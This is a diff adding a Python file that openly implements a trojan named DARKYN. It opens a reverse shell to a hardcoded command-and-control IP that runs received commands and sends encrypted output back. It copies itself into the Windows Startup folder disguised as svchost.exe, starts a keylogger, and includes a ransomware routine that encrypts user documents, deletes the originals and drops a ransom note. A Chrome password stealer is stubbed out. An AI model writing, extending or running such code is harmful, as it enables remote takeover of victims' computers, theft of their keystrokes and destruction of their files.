@@ -1,0 +1,159 @@
+```python
+import socket
+import subprocess
+import os
+import threading
+import time
+import cryptography
+import sys  # Import sys for executable path
+
+from cryptography.fernet import Fernet
+
+# ENCRYPTED PAYLOAD KEY
+KEY = b'XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxX'
+cipher = Fernet(KEY)
+
+
+class DARKYN_TROJAN:
+    def __init__(self):
+        self.C2 = "45.227.255.55"
+        self.PORT = 4444
+        self.PERSISTENCE = True
+        self.STEALTH_MODE = True
+        self.running = True  # Add a flag to control the main loop
+
+    def bypass_uac(self):
+        # UAC bypass technique
+        if os.name == 'nt':
+            import ctypes
+            try:
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+            except Exception as e:
+                print(f"UAC Bypass Failed: {e}")
+
+    def establish_connection(self):
+        while self.running:  # Use the running flag
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.C2, self.PORT))
+                while self.running:  # Use the running flag
+                    try:
+                        command = s.recv(1024).decode()
+                        if not command:
+                            break  # Connection closed by server
+                        if command.lower() == 'exit':
+                            self.running = False  # Set the flag to exit the outer loop
+                            break  # Exit the inner loop
+
+                        # Execute command
+                        try:
+                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
+                                                             timeout=15)  # Added timeout
+                            encrypted_output = cipher.encrypt(output)
+                        except subprocess.TimeoutExpired:
+                            encrypted_output = cipher.encrypt(b"Command timed out")
+                        except Exception as e:
+                            encrypted_output = cipher.encrypt(str(e).encode())
+
+                        s.send(encrypted_output + b"\n[ DARKYN_COMPLETE ]\n")
+                    except socket.error as e:
+                        print(f"Socket error during command execution: {e}")
+                        break  # Break inner loop on socket error
+                    except Exception as e:
+                        print(f"Error during command execution: {e}")
+                        encrypted_output = cipher.encrypt(str(e).encode())
+                        s.send(encrypted_output + b"\n[ DARKYN_COMPLETE ]\n")
+
+                s.close()  # Close the socket after exiting the inner loop
+                break  # Exit the outer loop after closing the socket
+            except socket.error as e:
+                print(f"Connection error: {e}")
+                time.sleep(30)
+            except Exception as e:
+                print(f"An unexpected error occurred: {e}")
+                time.sleep(30)
+
+    def add_to_startup(self):
+        if os.name == 'nt':
+            startup_path = os.path.join(os.getenv('APPDATA'),
+                                         'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe')
+            current_path = os.path.abspath(sys.executable)  # Use sys.executable
+            try:
+                if not os.path.exists(startup_path):
+                    import shutil
+                    shutil.copy2(current_path, startup_path)  # Use shutil.copy2 to preserve metadata
+            except Exception as e:
+                print(f"Startup persistence failed: {e}")
+
+    def hide_process(self):
+        # Process hiding technique
+        if os.name == 'nt':
+            import ctypes
+            try:
+                kernel32 = ctypes.WinDLL('kernel32')
+                kernel32.SetConsoleTitleW("svchost.exe")
+            except Exception as e:
+                print(f"Process hiding failed: {e}")
+
+    def keylogger_start(self):
+        # Simple keylogger from pynput
+        try:
+            from pynput import keyboard
+
+            def on_press(key):
+                try:
+                    with open("system_logs.txt", "a") as f:
+                        f.write(str(key) + "\n")
+                except Exception as e:
+                    print(f"Keylogger logging failed: {e}")
+
+            listener = keyboard.Listener(on_press=on_press)
+            listener.start()
+        except ImportError:
+            print("Pynput library not found. Keylogger functionality disabled.")
+        except Exception as e:
+            print(f"Keylogger failed to start: {e}")
+
+    def steal_passwords(self):
+        # Chrome password stealer
+        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google\\Chrome\\User Data\\Default\\Login Data')
+        if os.path.exists(chrome_path):
+            # Copy and decrypt passwords
+            # (implementation hidden for brevity)
+            print("Password stealing functionality is not implemented.")
+            pass
+
+    def ransomware_prepare(self):
+        # Prepare encryption for important files
+        extensions = ['.docx', '.xlsx', '.pdf', '.jpg', '.png', '.txt']
+        for root, dirs, files in os.walk('C:\\Users'):
+            for file in files:
+                if any(file.endswith(ext) for ext in extensions):
+                    # Encrypt file
+                    file_path = os.path.join(root, file)
+                    try:
+                        with open(file_path, 'rb') as f:
+                            data = f.read()
+                        encrypted = cipher.encrypt(data)
+                        with open(file_path + '.darkyn', 'wb') as f:
+                            f.write(encrypted)
+                        os.remove(file_path)
+                    except Exception as e:
+                        print(f"Encryption failed for {file_path}: {e}")
+
+        # Drop ransom note
+        try:
+            with open('C:\\Users\\Public\\README_DARKYN.txt', 'w') as f:
+                f.write("YOUR FILES HAVE BEEN ENCRYPTED BY DARKYN.  Contact darkyn@example.com for decryption key.")
+        except Exception as e:
+            print(f"Ransom note creation failed: {e}")
+
+
+if __name__ == "__main__":
+    trojan = DARKYN_TROJAN()
+    #trojan.bypass_uac() #Commented out for safety
+    trojan.add_to_startup()
+    trojan.hide_process()
+    threading.Thread(target=trojan.keylogger_start).start()
+    trojan.establish_connection()
+```
